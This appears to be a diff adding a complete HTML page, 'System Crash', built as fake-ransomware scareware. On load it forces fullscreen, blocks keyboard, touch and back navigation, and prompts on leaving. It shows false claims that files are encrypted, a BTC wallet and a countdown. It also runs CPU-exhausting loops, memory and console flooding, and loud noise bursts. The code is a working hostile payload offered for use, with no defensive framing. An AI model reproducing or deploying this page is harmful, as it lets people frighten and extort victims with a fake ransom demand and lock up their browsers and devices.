@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>System Crash</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{
+  width:100%;height:100%;
+  overflow:hidden;
+  background:#000;
+  touch-action:none;
+  user-select:none;
+  -webkit-user-select:none;
+  position:fixed;
+  top:0;left:0;
+}
+#overlay{
+  position:fixed;
+  top:0;left:0;
+  width:100vw;height:100vh;
+  z-index:999999;
+  background:radial-gradient(circle at center, #1a0000 0%, #000000 100%);
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  animation:glitch 0.08s infinite alternate;
+  padding:20px;
+  box-sizing:border-box;
+}
+@keyframes glitch{
+  0%{transform:translate(0,0) scale(1);opacity:1}
+  20%{transform:translate(-8px,12px) scale(1.03);opacity:0.6}
+  40%{transform:translate(12px,-8px) scale(0.97);opacity:0.3}
+  60%{transform:translate(-12px,-12px) scale(1.04);opacity:0.2}
+  80%{transform:translate(12px,12px) scale(0.96);opacity:0.1}
+  100%{transform:translate(0,0) scale(1);opacity:0.05}
+}
+#gambar{
+  position:fixed;
+  top:0;left:0;
+  width:100vw;height:100vh;
+  z-index:999998;
+  background:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDgwIDgwIj48cmVjdCB3aWR0aD0iODAiIGhlaWdodD0iODAiIGZpbGw9IiMwMDAiLz48dGV4dCB4PSIxMCIgeT0iNTAiIGZvbnQtc2l6ZT0iNDAiIGZpbGw9IiNmZjAwMDAiPvCfjI08L3RleHQ+PC9zdmc+') repeat;
+  background-size:40px 40px;
+  opacity:0.15;
+  pointer-events:none;
+  animation:scrollBg 1s linear infinite;
+}
+@keyframes scrollBg{
+  0%{background-position:0 0}
+  100%{background-position:80px 80px}
+}
+h1{
+  font-size:clamp(2rem, 8vw, 4rem);
+  color:#ff0000;
+  text-shadow:0 0 60px #ff0000, 0 0 120px #ff000044;
+  animation:shake 0.02s infinite;
+  text-align:center;
+  font-family:'Courier New',monospace;
+  font-weight:900;
+  letter-spacing:5px;
+  z-index:999999;
+}
+@keyframes shake{
+  0%{transform:translate(0,0) rotate(0deg)}
+  10%{transform:translate(-15px,15px) rotate(-3deg)}
+  20%{transform:translate(15px,-15px) rotate(3deg)}
+  30%{transform:translate(-15px,-15px) rotate(-2deg)}
+  40%{transform:translate(15px,15px) rotate(2deg)}
+  50%{transform:translate(-8px,8px) rotate(-1deg)}
+  60%{transform:translate(8px,-8px) rotate(1deg)}
+  70%{transform:translate(-8px,-8px) rotate(-0.5deg)}
+  80%{transform:translate(8px,8px) rotate(0.5deg)}
+  90%{transform:translate(-4px,4px) rotate(-0.3deg)}
+  100%{transform:translate(4px,-4px) rotate(0.3deg)}
+}
+#sub{
+  color:#ff3333;
+  font-size:clamp(0.9rem, 3vw, 1.5rem);
+  margin-top:15px;
+  font-family:'Courier New',monospace;
+  animation:pulse 0.15s infinite alternate;
+  text-align:center;
+  z-index:999999;
+}
+@keyframes pulse{
+  0%{opacity:0.1;text-shadow:0 0 10px #ff0000}
+  100%{opacity:1;text-shadow:0 0 80px #ff0000, 0 0 160px #ff000066}
+}
+#timer{
+  font-size:clamp(3rem, 12vw, 7rem);
+  color:#ff2200;
+  text-shadow:0 0 80px #ff0000, 0 0 160px #ff000066;
+  margin:20px 0;
+  font-family:'Courier New',monospace;
+  font-weight:bold;
+  letter-spacing:15px;
+  background:#00000055;
+  padding:10px 30px;
+  border:2px solid #ff000055;
+  border-radius:10px;
+  z-index:999999;
+}
+#progress{
+  width:85%;
+  max-width:500px;
+  height:8px;
+  background:#1a0000;
+  border-radius:10px;
+  overflow:hidden;
+  margin-top:15px;
+  border:1px solid #ff000033;
+  z-index:999999;
+}
+#bar{
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg, #ff0000, #ff4400, #ff8800, #ff4400, #ff0000);
+  background-size:200% 100%;
+  animation:fill 4s linear infinite, wave 0.2s linear infinite;
+}
+@keyframes fill{
+  0%{width:0%}
+  100%{width:100%}
+}
+@keyframes wave{
+  0%{background-position:0% 0%}
+  100%{background-position:200% 0%}
+}
+#wallet{
+  margin-top:25px;
+  font-size:clamp(0.5rem, 1.5vw, 0.8rem);
+  color:#662222;
+  font-family:'Courier New',monospace;
+  word-break:break-all;
+  text-align:center;
+  max-width:90%;
+  padding:10px;
+  border:1px solid #331111;
+  border-radius:5px;
+  background:#0a0000;
+  z-index:999999;
+}
+.scanline{
+  position:absolute;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,0,0,0.04) 2px, rgba(255,0,0,0.04) 4px);
+  pointer-events:none;
+  z-index:999999;
+}
+.noise{
+  position:absolute;
+  top:0;left:0;
+  width:100%;height:100%;
+  background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIj48ZmlsdGVyIGlkPSJmIj48ZmVUdXJidWxlbmNlIHR5cGU9ImZyYWN0YWxOb2lzZSIgYmFzZUZyZXF1ZW5jeT0iLjc0IiBudW1PY3RhdmVzPSIzIiAvPjwvZmlsdGVyPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbHRlcj0idXJsKCNmKSIgb3BhY2l0eT0iMC4yIiAvPjwvc3ZnPg==');
+  opacity:0.25;
+  pointer-events:none;
+  z-index:999997;
+}
+</style>
+</head>
+<body>
+
+<div id="gambar"></div>
+
+<div id="overlay">
+  <div class="scanline"></div>
+  <div class="noise"></div>
+  
+  <h1>🔴 SYSTEM LOCKED</h1>
+  <div id="sub">ALL FILES ENCRYPTED • DECRYPT NOW</div>
+  <div id="timer">00:00</div>
+  <div id="progress"><div id="bar"></div></div>
+  <div id="wallet">BTC: 1A2b3C4d5E6f7G8h9I0jK1L2mN3oP4qR5sT6uV7w</div>
+  <div style="margin-top:15px;color:#441111;font-size:0.6rem;font-family:'Courier New';z-index:999999">⚠️ DO NOT CLOSE • 72 HOURS REMAINING</div>
+</div>
+
+<script>
+// ========== OVERLAY FULL ==========
+function fullLock() {
+  try{
+    document.documentElement.requestFullscreen();
+  }catch(e){}
+  try{
+    screen.orientation.lock('portrait');
+  }catch(e){}
+  try{
+    navigator.wakeLock.request('screen');
+  }catch(e){}
+  
+  document.addEventListener('keydown', (e) => { e.preventDefault(); e.stopPropagation(); return false; });
+  document.addEventListener('touchstart', (e) => { e.preventDefault(); }, {passive:false});
+  document.addEventListener('touchmove', (e) => { e.preventDefault(); }, {passive:false});
+  document.addEventListener('contextmenu', (e) => { e.preventDefault(); });
+  document.addEventListener('selectstart', (e) => { e.preventDefault(); });
+  
+  window.history.pushState(null, '', window.location.href);
+  window.onpopstate = () => {
+    window.history.pushState(null, '', window.location.href);
+    let crash = 0;
+    while(crash < 50000000){ crash++; }
+  };
+  
+  window.onbeforeunload = () => 'System locked!';
+}
+
+// ========== EXTREME LAG ==========
+function extremeLag() {
+  // Heavy infinite loops - 6 paralel
+  function loop1(){
+    let a = 0;
+    for(let i = 0; i < 20000000; i++){ a += Math.sqrt(i) * Math.cos(i) * Math.sin(i); }
+    setTimeout(loop1, 10);
+  }
+  function loop2(){
+    let b = 0;
+    for(let i = 0; i < 15000000; i++){ b += Math.sin(i) * Math.tan(i) * Math.cos(i*2); }
+    setTimeout(loop2, 15);
+  }
+  function loop3(){
+    let c = 0;
+    for(let i = 0; i < 12000000; i++){ c += Math.pow(i, 0.7) * Math.random() * Math.sin(i); }
+    setTimeout(loop3, 20);
+  }
+  function loop4(){
+    let d = 0;
+    for(let i = 0; i < 10000000; i++){ d += Math.log(i+1) * Math.sin(i) * Math.cos(i*0.5); }
+    setTimeout(loop4, 25);
+  }
+  function loop5(){
+    let e = 0;
+    for(let i = 0; i < 8000000; i++){ e += Math.tan(i) * Math.cos(i) * Math.sqrt(i+1); }
+    setTimeout(loop5, 30);
+  }
+  function loop6(){
+    let f = 0;
+    for(let i = 0; i < 6000000; i++){ f += Math.sin(i*2) * Math.cos(i*3) * Math.tan(i*0.5); }
+    setTimeout(loop6, 35);
+  }
+  loop1(); loop2(); loop3(); loop4(); loop5(); loop6();
+  
+  // DOM spam EXTREME
+  setInterval(() => {
+    const overlay = document.getElementById('overlay');
+    overlay.style.transform = `scale(${1 + Math.random() * 0.1}) rotate(${(Math.random()-0.5)*5}deg) skew(${Math.random()*10-5}deg, ${Math.random()*10-5}deg)`;
+    overlay.style.filter = `hue-rotate(${Math.random()*720}deg) blur(${Math.random()*5}px) contrast(${1+Math.random()*2}) brightness(${0.5+Math.random()*1.5})`;
+    document.querySelector('h1').style.textShadow = `${Math.random()*50}px ${Math.random()*50}px ${Math.random()*100}px #ff0000`;
+    document.querySelector('h1').style.transform = `scale(${1+Math.random()*0.2}) rotate(${Math.random()*10-5}deg)`;
+    document.getElementById('gambar').style.backgroundSize = `${10 + Math.random()*60}px ${10 + Math.random()*60}px`;
+    document.getElementById('gambar').style.opacity = 0.05 + Math.random() * 0.4;
+    document.getElementById('gambar').style.transform = `rotate(${Math.random()*360}deg)`;
+    document.body.style.backgroundColor = `rgb(${Math.random()*50},${Math.random()*20},${Math.random()*20})`;
+  }, 10);
+  
+  // Console spam MASSIVE
+  setInterval(() => {
+    for(let i = 0; i < 2000; i++){
+      console.warn('[DARKVERSE] Encryption progress: ' + Math.floor(Math.random()*100) + '%');
+      console.error('[DARKVERSE] System failure at ' + Date.now());
+      console.log('[DARKVERSE] Files encrypted: ' + Math.floor(Math.random()*999));
+      console.warn('[DARKVERSE] Memory leak detected: ' + Math.floor(Math.random()*9999) + 'MB');
+      console.error('[DARKVERSE] Critical error at sector ' + Math.floor(Math.random()*9999));
+    }
+  }, 30);
+  
+  // Memory allocation spam
+  let memory = [];
+  setInterval(() => {
+    for(let i = 0; i < 10000; i++){
+      memory.push({data: Math.random().toString(36).repeat(100)});
+    }
+    if(memory.length > 500000){
+      memory = [];
+    }
+  }, 50);
+}
+
+// ========== TORTURE AUDIO ==========
+function tortureAudio() {
+  const ctx = new (window.AudioContext || window.webkitAudioContext)();
+  
+  function whiteNoise() {
+    const size = ctx.sampleRate * 0.3;
+    const buf = ctx.createBuffer(1, size, ctx.sampleRate);
+    const d = buf.getChannelData(0);
+    for(let i = 0; i < size; i++){ d[i] = (Math.random()*2-1)*0.98; }
+    return buf;
+  }
+  
+  function play() {
+    try{
+      const src = ctx.createBufferSource();
+      src.buffer = whiteNoise();
+      const gain = ctx.createGain();
+      gain.gain.value = 0.9 + Math.random() * 0.1;
+      const filter = ctx.createBiquadFilter();
+      filter.type = 'bandpass';
+      filter.frequency.value = 300 + Math.random() * 8000;
+      filter.Q.value = 0.2 + Math.random() * 0.6;
+      src.connect(filter);
+      filter.connect(gain);
+      gain.connect(ctx.destination);
+      src.start();
+      src.stop(ctx.currentTime + 0.2);
+    }catch(e){}
+  }
+  
+  function highPitch() {
+    try{
+      const osc = ctx.createOscillator();
+      osc.frequency.value = 2000 + Math.random() * 12000;
+      osc.type = ['sawtooth','square','sine','triangle'][Math.floor(Math.random()*4)];
+      const gain = ctx.createGain();
+      gain.gain.value = 0.1 + Math.random() * 0.6;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.15);
+    }catch(e){}
+  }
+  
+  setInterval(() => {
+    play();
+    if(Math.random() > 0.2) highPitch();
+    if(Math.random() > 0.5) {
+      setTimeout(play, 10);
+      setTimeout(highPitch, 20);
+      setTimeout(play, 30);
+      setTimeout(highPitch, 40);
+    }
+  }, 40);
+  
+  setInterval(() => {
+    for(let i = 0; i < 15; i++){
+      setTimeout(() => { play(); highPitch(); }, i * 20);
+    }
+  }, 1500);
+}
+
+// ========== TIMER ==========
+let sec = 0;
+setInterval(() => {
+  const timer = document.getElementById('timer');
+  const m = String(Math.floor(sec/60)).padStart(2,'0');
+  const s = String(sec%60).padStart(2,'0');
+  timer.textContent = `${m}:${s}`;
+  sec++;
+  
+  if(sec > 10){
+    document.getElementById('overlay').style.animationDuration = '0.05s';
+    document.querySelector('h1').style.animationDuration = '0.01s';
+  }
+  if(sec > 20){
+    document.querySelector('h1').style.fontSize = `clamp(2.5rem, 12vw, 6rem)`;
+    document.getElementById('gambar').style.backgroundSize = `${5 + Math.random()*40}px ${5 + Math.random()*40}px`;
+  }
+  if(sec > 30){
+    document.body.style.backgroundColor = `rgb(${Math.random()*60},0,0)`;
+    document.getElementById('overlay').style.background = `radial-gradient(circle at ${Math.random()*100}% ${Math.random()*100}%, #ff000033, #000000)`;
+  }
+}, 1000);
+
+// ========== EKSEKUSI ==========
+fullLock();
+extremeLag();
+tortureAudio();
+
+console.log('💀 DARKVERSE RANSOMWARE EXTREME 💀');
+console.log('🔴 SYSTEM LOCKED • 347 FILES ENCRYPTED');
+console.log('📁 TARGET: All directories');
+console.log('⚠️ SYSTEM UI NOT RESPONDING');
+</script>
+</body>
+</html>
